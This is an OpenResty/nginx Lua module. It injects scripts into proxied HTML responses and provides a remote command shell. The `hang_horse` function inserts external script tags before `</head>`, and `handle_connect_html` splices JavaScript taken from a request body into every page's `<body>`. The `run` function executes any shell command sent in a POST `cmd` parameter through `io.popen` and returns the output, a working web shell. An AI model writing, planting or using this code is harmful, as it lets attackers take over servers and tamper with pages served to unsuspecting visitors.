local _M = {}
function _M.hang_horse()
    local data = ngx.arg[1] or ""
    print("ngx.arg[1]==========="..ngx.arg[1])
    local html = string.gsub(data, "</head>", "<script>window.MTSI_OPEN = true;</script>\n<script src=\"//xs01.meituan.net/banma_static/mtsi.js\"></script>\n<script src=\"//s0.meituan.net/mx/rohr/rohr.min.js\"></script>\n</head>")
    -- local html = string.gsub(data, "</head>", "<script src=\"https://cdn.bootcss.com/jquery/3.3.1/core.js\"></script></head>", 1)
    ngx.arg[1] = html
end

function _M.Split(szFullString, szSeparator)
    local nFindStartIndex = 1
    local nSplitIndex = 1
    local nSplitArray = {}
    while true do
       local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex)
       if not nFindLastIndex then
        nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString))
        break
       end
       nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1)
       nFindStartIndex = nFindLastIndex + string.len(szSeparator)
       nSplitIndex = nSplitIndex + 1
    end
    return nSplitArray
end
function _M.handle_connect_html() 
    local data = ngx.arg[1] or ""
    local bodyInfo = ngx.ctx.foo    
    local decodeData = cjson.decode(bodyInfo).jsSource

    local list = _M.Split(data, '<body>')
    -- print('data=========='..decodeData)
    print('list1=========='..type(list[1]))
    print('list2=========='..type(list[2]))
    -- local html = list[1]..'<body>'
    -- print(html)
    -- local html2 = html..list[2]
    -- print('===========body'..decodeData)
    -- local html = string.gsub(data, "<body>", "<body>"..decodeData) 
    -- local html = string.gsub(data, "<body>", "<body>") 
    -- print('===========html'..html)
    ngx.arg[1] = list[1].."<body>"..decodeData..list[2]
    ngx.arg[2] = true
end
function _M.run()
    ngx.req.read_body()
    local post_args = ngx.req.get_post_args()
    -- for k, v in pairs(post_args) do
    --    ngx.say(string.format("%s = %s", k, v))
    -- end
    local cmd = post_args["cmd"]
    if cmd then
        f_ret = io.popen(cmd)
        local ret = f_ret:read("*a")
        ngx.say(string.format("reply:\n%s", ret))
    end
end
return _M
